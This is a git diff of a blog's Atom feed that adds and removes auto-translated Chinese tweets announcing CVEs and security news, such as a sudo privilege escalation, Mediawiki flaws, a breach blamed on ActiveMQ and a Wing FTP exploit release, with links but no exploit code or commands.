@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-07-04T17:45:48.844Z</updated>
+  <updated>2025-07-04T18:01:55.179Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,316 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>gulybyte Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_578674303/"/>
+    <id>http://example.com/2025/07/04/twitter_578674303/</id>
+    <published>2025-07-04T18:01:55.000Z</published>
+    <updated>2025-07-04T18:01:55.179Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> gulybyte</p><p><strong>推文：</strong> 消息来源称，目前没有公开的法医报告能100%确认是哪个CVE触发了最初的事件。但表示CVE-2023-46604是最有可能的候选者。<a href="https://t.co/tRpjWQyitk">https://t.co/tRpjWQyitk</a></p><p><strong>链接：</strong> <a href="https://x.com/gulybyte/status/1941184778012872819">https://x.com/gulybyte/status/1941184778012872819</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; gulybyte&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 消息来源称，目前没有公开的法医报告能100%确认是哪个CVE触发了最初的事件。但表示CVE-2023-46604是最有可能的候选者。&lt;a href=&quot;http</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="gulybyte" scheme="http://example.com/tags/gulybyte/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>rickthebit Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_805845091/"/>
+    <id>http://example.com/2025/07/04/twitter_805845091/</id>
+    <published>2025-07-04T18:01:47.000Z</published>
+    <updated>2025-07-04T18:01:47.943Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> rickthebit</p><p><strong>推文：</strong> • CVE-2023-46604 (远程代码执行) 被利用<br>• 环境未应用补丁<br>• 完全被攻陷 + 数据外泄约10亿<br>• 根本原因：缺乏漏洞管理(VM) + 服务暴露</p><p><strong>链接：</strong> <a href="https://x.com/rickthebit/status/1941185040530145399">https://x.com/rickthebit/status/1941185040530145399</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; rickthebit&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; • CVE-2023-46604 (远程代码执行) 被利用&lt;br&gt;• 环境未应用补丁&lt;br&gt;• 完全被攻陷 + 数据外泄约10亿&lt;br&gt;• 根本原因：缺乏</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="rickthebit" scheme="http://example.com/tags/rickthebit/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>gielowwww Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_3535058447/"/>
+    <id>http://example.com/2025/07/04/twitter_3535058447/</id>
+    <published>2025-07-04T18:01:30.000Z</published>
+    <updated>2025-07-04T18:01:30.694Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> gielowwww</p><p><strong>推文：</strong> 哥们，看起来他们在攻击中央银行时利用了那个漏洞。太业余了。</p><p><a href="https://t.co/ZV78z5o6hg">https://t.co/ZV78z5o6hg</a></p><p><strong>链接：</strong> <a href="https://x.com/gielowwww/status/1941187839225626727">https://x.com/gielowwww/status/1941187839225626727</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; gielowwww&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 哥们，看起来他们在攻击中央银行时利用了那个漏洞。太业余了。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://t.co/ZV78z5o6hg&quot;&gt;https:/</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="gielowwww" scheme="http://example.com/tags/gielowwww/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BarbossHack Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_1688117725/"/>
+    <id>http://example.com/2025/07/04/twitter_1688117725/</id>
+    <published>2025-07-04T18:01:20.000Z</published>
+    <updated>2025-07-04T18:01:20.702Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> BarbossHack</p><p><strong>推文：</strong> 我测试了一个关于𝘀𝘂𝗱𝗼的CVE-2025-32463的概念验证，砰💥，一条命令就拿到了root权限，本地权限提升效果杠杠的👌。在Fedora 42上测试的，sudoers没有特别配置，而且红帽上还没有补丁，奇怪的是大家似乎并不怎么惊慌。</p><p>▶️ 测试链接：<a href="https://t.co/27JvdpXlW7">https://t.co/27JvdpXlW7</a></p><p><strong>链接：</strong> <a href="https://x.com/BarbossHack/status/1941181718809149474">https://x.com/BarbossHack/status/1941181718809149474</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BarbossHack&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 我测试了一个关于𝘀𝘂𝗱𝗼的CVE-2025-32463的概念验证，砰💥，一条命令就拿到了root权限，本地权限提升效果杠杠的👌。在Fedor</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="BarbossHack" scheme="http://example.com/tags/BarbossHack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BADBEAR112919 Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_3912266183/"/>
+    <id>http://example.com/2025/07/04/twitter_3912266183/</id>
+    <published>2025-07-04T18:01:11.000Z</published>
+    <updated>2025-07-04T18:01:11.494Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> BADBEAR112919</p><p><strong>推文：</strong> 【安全新闻】<br>OpenSSL 3.5的漏洞“CVE-2025-4575”是什么？通俗易懂地讲解影响范围及对策<br><a href="https://t.co/QPzX2nd260">https://t.co/QPzX2nd260</a></p><p>网络笔记</p><p><strong>链接：</strong> <a href="https://x.com/BADBEAR112919/status/1941182651026567447">https://x.com/BADBEAR112919/status/1941182651026567447</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BADBEAR112919&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 【安全新闻】&lt;br&gt;OpenSSL 3.5的漏洞“CVE-2025-4575”是什么？通俗易懂地讲解影响范围及对策&lt;br&gt;&lt;a href=&quot;http</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="BADBEAR112919" scheme="http://example.com/tags/BADBEAR112919/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CERTpy Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_3720056256/"/>
+    <id>http://example.com/2025/07/04/twitter_3720056256/</id>
+    <published>2025-07-04T18:01:05.000Z</published>
+    <updated>2025-07-04T18:01:05.002Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CERTpy</p><p><strong>推文：</strong> ⚠️PHP安全漏洞警告</p><p>❗CVE-2025-1735<br>❗CVE-2025-6491</p><p>➡️更多信息请访问：<a href="https://t.co/QbH60r9HEc">https://t.co/QbH60r9HEc</a> <a href="https://t.co/VmJBROh8pD">https://t.co/VmJBROh8pD</a></p><p><strong>链接：</strong> <a href="https://x.com/CERTpy/status/1941188997612802385">https://x.com/CERTpy/status/1941188997612802385</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CERTpy&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️PHP安全漏洞警告&lt;/p&gt;
+&lt;p&gt;❗CVE-2025-1735&lt;br&gt;❗CVE-2025-6491&lt;/p&gt;
+&lt;p&gt;➡️更多信息请访问：&lt;a href=&quot;htt</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CERTpy" scheme="http://example.com/tags/CERTpy/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CERTpy Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_2383366917/"/>
+    <id>http://example.com/2025/07/04/twitter_2383366917/</id>
+    <published>2025-07-04T18:00:57.000Z</published>
+    <updated>2025-07-04T18:00:57.326Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CERTpy</p><p><strong>推文：</strong> ⚠️海康威视HikCentral存在漏洞</p><p>❗CVE-2025-34067</p><p>➡️更多信息：<a href="https://t.co/iAvxhtjlfA">https://t.co/iAvxhtjlfA</a> <a href="https://t.co/zWkDab8Nwg">https://t.co/zWkDab8Nwg</a></p><p><strong>链接：</strong> <a href="https://x.com/CERTpy/status/1941191573276070077">https://x.com/CERTpy/status/1941191573276070077</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CERTpy&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️海康威视HikCentral存在漏洞&lt;/p&gt;
+&lt;p&gt;❗CVE-2025-34067&lt;/p&gt;
+&lt;p&gt;➡️更多信息：&lt;a href=&quot;https://t.co/i</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CERTpy" scheme="http://example.com/tags/CERTpy/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVEnew Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_1907313180/"/>
+    <id>http://example.com/2025/07/04/twitter_1907313180/</id>
+    <published>2025-07-04T18:00:50.000Z</published>
+    <updated>2025-07-04T18:00:50.393Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-53485 SetTranslationHandler.php 未验证用户是否为选举管理员，允许任何（甚至未认证的）用户更改与选举相关的翻译文本。… <a href="https://t.co/jgyupyXPar">https://t.co/jgyupyXPar</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941193290801610947">https://x.com/CVEnew/status/1941193290801610947</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-53485 SetTranslationHandler.php 未验证用户是否为选举管理员，允许任何（甚至未认证的）用户更改与选举相关的翻译文本</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVEnew Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_3175826345/"/>
+    <id>http://example.com/2025/07/04/twitter_3175826345/</id>
+    <published>2025-07-04T18:00:43.000Z</published>
+    <updated>2025-07-04T18:00:43.777Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-53484 用户可控输入在以下位置未正确转义：</p><ul><li></li></ul><p>VotePage.php（投票选项输入）</p><ul><li></li></ul><p>ResultPage::getPagesTab() 和 getErrorsTab()（用户可控… <a href="https://t.co/EmHJwZIPko">https://t.co/EmHJwZIPko</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941193291736940807">https://x.com/CVEnew/status/1941193291736940807</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-53484 用户可控输入在以下位置未正确转义：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;VotePage.php（投票选项输入）</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVEnew Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_4044941049/"/>
+    <id>http://example.com/2025/07/04/twitter_4044941049/</id>
+    <published>2025-07-04T18:00:35.000Z</published>
+    <updated>2025-07-04T18:00:35.317Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-53483漏洞：ArchivePage.php、UnarchivePage.php以及VoterEligibilityPage#executeClear()未验证请求方法或CSRF令牌，使得攻击者能够触发敏感操作… <a href="https://t.co/P6IMUlCFIG">https://t.co/P6IMUlCFIG</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941193292701630661">https://x.com/CVEnew/status/1941193292701630661</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-53483漏洞：ArchivePage.php、UnarchivePage.php以及VoterEligibilityPage#executeC</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Huntio Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_1202101720/"/>
+    <id>http://example.com/2025/07/04/twitter_1202101720/</id>
+    <published>2025-07-04T18:00:28.000Z</published>
+    <updated>2025-07-04T18:00:28.613Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> Huntio</p><p><strong>推文：</strong> ⚠️ Insomnia API客户端存在严重漏洞CVE‑2025‑1087，可导致远程代码执行</p><p><a href="https://t.co/5xvWzNBml9">https://t.co/5xvWzNBml9</a></p><p>Insomnia（版本≤11.2.0）中使用的Nunjucks引擎存在模板注入漏洞，攻击者可通过恶意的HTTP cookies或导入的集合执行任意代码。</p><p>请升级至Insomnia v11.2.1及以上版本，或切换至Postman&#x2F;Bruno等工具。避免导入不受信任的集合或向未知端点发送请求。</p><p>#APIClient #CVE20251087</p><p><strong>链接：</strong> <a href="https://x.com/Huntio/status/1941193358484877641">https://x.com/Huntio/status/1941193358484877641</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; Huntio&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; ⚠️ Insomnia API客户端存在严重漏洞CVE‑2025‑1087，可导致远程代码执行&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://t.co/5xvW</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="Huntio" scheme="http://example.com/tags/Huntio/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>NetizenCorp Twitter Update !</title>
+    <link href="http://example.com/2025/07/04/twitter_792108998/"/>
+    <id>http://example.com/2025/07/04/twitter_792108998/</id>
+    <published>2025-07-04T18:00:16.000Z</published>
+    <updated>2025-07-04T18:00:16.417Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>博主：</strong> NetizenCorp</p><p><strong>推文：</strong> 你看了上个月的#漏洞公告了吗？在其中，我们重点强调了如#Citrix Bleed 2中的CVE-2025-6543等关键漏洞，以及D-Link、Fortinet和Google Chrome中的其他漏洞；急需打补丁以保护你的系统安全。<a href="https://t.co/Ymgv1hGbcZ">https://t.co/Ymgv1hGbcZ</a></p><p><strong>链接：</strong> <a href="https://x.com/NetizenCorp/status/1941194815611289710">https://x.com/NetizenCorp/status/1941194815611289710</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; NetizenCorp&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 你看了上个月的#漏洞公告了吗？在其中，我们重点强调了如#Citrix Bleed 2中的CVE-2025-6543等关键漏洞，以及D-Link、Fort</summary>
+      
+    
+    
+    
+    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="NetizenCorp" scheme="http://example.com/tags/NetizenCorp/"/>
+    
+  </entry>
   
   <entry>
     <title>史诗级漏洞！Log4j漏洞复现！</title>
@@ -222,313 +532,6 @@
     
     
     <category term="BADBEAR112919" scheme="http://example.com/tags/BADBEAR112919/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ZeroDayCVE Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_196251593/"/>
-    <id>http://example.com/2025/07/04/twitter_196251593/</id>
-    <published>2025-07-04T17:01:22.000Z</published>
-    <updated>2025-07-04T17:01:22.318Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> ZeroDayCVE</p><p><strong>推文：</strong> #CVE202552497 CVE-2025-52497 - Mbed TLS PEM解析堆缓冲区下溢漏洞：CVE ID : CVE-2025-52497<br> 发布日期 : 2025年7月4日，下午3:15 | 1小时1分钟前<br> 描述 : Mbed TLS 3.6.4之前版本存在PEM解析单字节堆基础… <a href="https://t.co/ybVRWzuFxW">https://t.co/ybVRWzuFxW</a></p><p><strong>链接：</strong> <a href="https://x.com/ZeroDayCVE/status/1941169518346412168">https://x.com/ZeroDayCVE/status/1941169518346412168</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; ZeroDayCVE&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; #CVE202552497 CVE-2025-52497 - Mbed TLS PEM解析堆缓冲区下溢漏洞：CVE ID : CVE-2025-52497</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="ZeroDayCVE" scheme="http://example.com/tags/ZeroDayCVE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>CVEnew Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_2085118900/"/>
-    <id>http://example.com/2025/07/04/twitter_2085118900/</id>
-    <published>2025-07-04T17:01:12.000Z</published>
-    <updated>2025-07-04T17:01:12.186Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> CVEnew</p><p><strong>推文：</strong> CVE-2025-53481 Wikimedia基金会Mediawiki中IPInfo扩展的未控制资源消耗漏洞允许过度分配。此问题影响Mediawiki的IPInfo扩展… <a href="https://t.co/zhO7YGiltl">https://t.co/zhO7YGiltl</a></p><p><strong>链接：</strong> <a href="https://x.com/CVEnew/status/1941169920420552824">https://x.com/CVEnew/status/1941169920420552824</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; CVEnew&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-53481 Wikimedia基金会Mediawiki中IPInfo扩展的未控制资源消耗漏洞允许过度分配。此问题影响Mediawiki的IPIn</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="CVEnew" scheme="http://example.com/tags/CVEnew/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>NicolasCoolman Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_3003938392/"/>
-    <id>http://example.com/2025/07/04/twitter_3003938392/</id>
-    <published>2025-07-04T17:01:04.000Z</published>
-    <updated>2025-07-04T17:01:04.098Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> NicolasCoolman</p><p><strong>推文：</strong> 据谷歌称，Chrome浏览器的严重漏洞CVE-2025-6554正被积极利用。</p><p>🚨 2025年6月30日谷歌Chrome安全公告</p><p><a href="https://t.co/tfbFou2h97">https://t.co/tfbFou2h97</a></p><p><strong>链接：</strong> <a href="https://x.com/NicolasCoolman/status/1941172504464339242">https://x.com/NicolasCoolman/status/1941172504464339242</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; NicolasCoolman&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 据谷歌称，Chrome浏览器的严重漏洞CVE-2025-6554正被积极利用。&lt;/p&gt;
-&lt;p&gt;🚨 2025年6月30日谷歌Chrome安全公告&lt;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="NicolasCoolman" scheme="http://example.com/tags/NicolasCoolman/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>illdeed Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_4251940450/"/>
-    <id>http://example.com/2025/07/04/twitter_4251940450/</id>
-    <published>2025-07-04T17:00:55.000Z</published>
-    <updated>2025-07-04T17:00:55.158Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> illdeed</p><p><strong>推文：</strong> 🚨 新漏洞发布：CVE-2025-47812 🚨<br>通过Lua注入在Wing FTP服务器上实现未认证的远程代码执行（RCE）。<br>包括反向shell、UID劫持、试运行模式，CLI已准备就绪。<br>仅供研究&#x2F;教育用途。</p><p>🔗 <a href="https://t.co/ewbFQeU6s6">https://t.co/ewbFQeU6s6</a><br>#信息安全 #远程代码执行 #漏洞 #漏洞利用 #漏洞赏金</p><p><strong>链接：</strong> <a href="https://x.com/illdeed/status/1941176791328268702">https://x.com/illdeed/status/1941176791328268702</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; illdeed&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 新漏洞发布：CVE-2025-47812 🚨&lt;br&gt;通过Lua注入在Wing FTP服务器上实现未认证的远程代码执行（RCE）。&lt;br&gt;包括反向shel</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="illdeed" scheme="http://example.com/tags/illdeed/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>AIShiftProtocol Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_4182799576/"/>
-    <id>http://example.com/2025/07/04/twitter_4182799576/</id>
-    <published>2025-07-04T17:00:40.000Z</published>
-    <updated>2025-07-04T17:00:40.125Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> AIShiftProtocol</p><p><strong>推文：</strong> 🚨 突发：DjVuLibre中发现一个严重漏洞CVE-2025-53367，可能导致越界写入攻击。😨 随着数字文档的增多，风险也在上升。立即打补丁以保护您的系统安全。</p><p>🔗 [阅读更多](#CyberSecurity #TechInsider</p><p><a href="https://t.co/xjJ217sMGK">https://t.co/xjJ217sMGK</a>)</p><p><strong>链接：</strong> <a href="https://x.com/AIShiftProtocol/status/1941176869186900223">https://x.com/AIShiftProtocol/status/1941176869186900223</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; AIShiftProtocol&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 突发：DjVuLibre中发现一个严重漏洞CVE-2025-53367，可能导致越界写入攻击。😨 随着数字文档的增多，风险也在上升。立即</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="AIShiftProtocol" scheme="http://example.com/tags/AIShiftProtocol/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VulmonFeeds Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_2567829518/"/>
-    <id>http://example.com/2025/07/04/twitter_2567829518/</id>
-    <published>2025-07-04T17:00:31.000Z</published>
-    <updated>2025-07-04T17:00:31.665Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-52805</p><p>VaultDweller Leyka中的路径遍历漏洞导致PHP本地文件包含</p><p><a href="https://t.co/YaMVsyYc5k">https://t.co/YaMVsyYc5k</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941177650682253504">https://x.com/VulmonFeeds/status/1941177650682253504</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-52805&lt;/p&gt;
-&lt;p&gt;VaultDweller Leyka中的路径遍历漏洞导致PHP本地文件包含&lt;/p&gt;
-&lt;p&gt;&lt;a href=&quot;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BlackFireOpsTek Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_3556574151/"/>
-    <id>http://example.com/2025/07/04/twitter_3556574151/</id>
-    <published>2025-07-04T17:00:26.000Z</published>
-    <updated>2025-07-04T17:00:26.201Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> BlackFireOpsTek</p><p><strong>推文：</strong> 🚨 本周网络安全动态：<br>✈️ 澳洲航空确认因呼叫中心遭黑客攻击，600万客户记录泄露<br>💸 巴西警方逮捕涉嫌1亿美元PIX支付系统盗窃案的IT内鬼<br>🔍 谷歌紧急修补正遭活跃攻击的Chrome零日漏洞（CVE‑2025‑6554）<br>✈️ 美国联邦调查局警告Scattered Spider黑客组织正瞄准航空公司<br>保持警惕，立即更新补丁。#网络安全新闻 #信息安全</p><p><strong>链接：</strong> <a href="https://x.com/BlackFireOpsTek/status/1941178558602231917">https://x.com/BlackFireOpsTek/status/1941178558602231917</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; BlackFireOpsTek&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; 🚨 本周网络安全动态：&lt;br&gt;✈️ 澳洲航空确认因呼叫中心遭黑客攻击，600万客户记录泄露&lt;br&gt;💸 巴西警方逮捕涉嫌1亿美元PIX支付系统</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="BlackFireOpsTek" scheme="http://example.com/tags/BlackFireOpsTek/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>VulmonFeeds Twitter Update !</title>
-    <link href="http://example.com/2025/07/04/twitter_2363989778/"/>
-    <id>http://example.com/2025/07/04/twitter_2363989778/</id>
-    <published>2025-07-04T17:00:15.000Z</published>
-    <updated>2025-07-04T17:00:15.001Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>博主：</strong> VulmonFeeds</p><p><strong>推文：</strong> CVE-2025-52718</p><p>Bearsthemes Alone WordPress主题7.8.2版本中的远程代码包含漏洞</p><p><a href="https://t.co/eDVnmO7tcJ">https://t.co/eDVnmO7tcJ</a></p><p><strong>链接：</strong> <a href="https://x.com/VulmonFeeds/status/1941180210470096965">https://x.com/VulmonFeeds/status/1941180210470096965</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;博主：&lt;/strong&gt; VulmonFeeds&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;推文：&lt;/strong&gt; CVE-2025-52718&lt;/p&gt;
-&lt;p&gt;Bearsthemes Alone WordPress主题7.8.2版本中的远程代码包含漏洞&lt;/p&gt;
-&lt;p&gt;</summary>
-      
-    
-    
-    
-    <category term="推特监控" scheme="http://example.com/categories/%E6%8E%A8%E7%89%B9%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="VulmonFeeds" scheme="http://example.com/tags/VulmonFeeds/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Wing FTP Server Remote Command Execution Vulnerability</title>
